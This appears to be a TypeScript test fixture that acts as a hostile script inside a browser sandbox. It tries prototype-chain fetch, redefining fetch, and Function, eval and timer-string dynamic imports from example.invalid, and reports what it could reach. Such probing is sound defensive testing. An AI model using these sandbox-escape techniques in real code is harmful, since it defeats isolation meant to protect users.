// Hostile-model probe for the browser kernel lockdown (tests/perf/
// paramEditFrame.spec.ts). It tries every network, storage, messaging and
// code-generation capability the way a real attack would — through `self`
// (not shadowed by the realm runner) and the Function constructor — and
// reports what it could reach by failing with a PROBE:{...} message. Any
// request it manages to make goes to example.invalid, which the test watches.
const realm = self as any;
const report: Record<string, string> = { origin: String(realm.origin) };
function attempt(name: string, run: () => unknown): void {
  try {
    const value = run() as { then?: unknown; catch?: (f: () => void) => void } | undefined;
    if (value && typeof value.catch === 'function') value.catch(() => undefined);
    report[name] = 'reachable';
  } catch {
    report[name] = 'blocked';
  }
}
const workerScope = Object.getPrototypeOf(Object.getPrototypeOf(realm));
attempt('fetch', () => realm.fetch('https://example.invalid/fetch'));
attempt('fetchViaPrototype', () => workerScope.fetch.call(realm, 'https://example.invalid/proto-fetch'));
attempt('XMLHttpRequest', () => new realm.XMLHttpRequest());
attempt('WebSocket', () => new realm.WebSocket('wss://example.invalid/ws'));
attempt('EventSource', () => new realm.EventSource('https://example.invalid/es'));
attempt('importScripts', () => realm.importScripts('https://example.invalid/import-scripts.js'));
attempt('indexedDB', () => realm.indexedDB.open('kernelcad'));
attempt('caches', () => realm.caches.open('kernelcad'));
attempt('BroadcastChannel', () => new realm.BroadcastChannel('kernelcad'));
attempt('postMessage', () => realm.postMessage({ type: 'result', jobId: 1 }));
attempt('restoreFetch', () => {
  Object.defineProperty(workerScope, 'fetch', { value: () => 'restored' });
  return realm.fetch('https://example.invalid/restored');
});
// Code generation: each of these could synthesize `import(...)` at run time.
attempt('FunctionImport', () => realm.Function('return import("https://example.invalid/function.js")')());
attempt('constructorImport', () => (() => 0).constructor('return import("https://example.invalid/constructor.js")')());
attempt('eval', () => (0, realm.eval)('import("https://example.invalid/eval.js")'));
attempt('AsyncFunction', () => (async () => 0).constructor('return import("https://example.invalid/async.js")')());
attempt('GeneratorFunction', () => (function* gen() { yield 0; }).constructor('yield 1'));
attempt('setTimeoutString', () => realm.setTimeout('import("https://example.invalid/timer.js")', 0));
attempt('WebAssemblyMemory', () => new realm.WebAssembly.Memory({ initial: 32768 }));
attempt('WebAssemblyCompile', () => realm.WebAssembly.compile(new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0])));
throw new Error('PROBE:' + JSON.stringify(report));
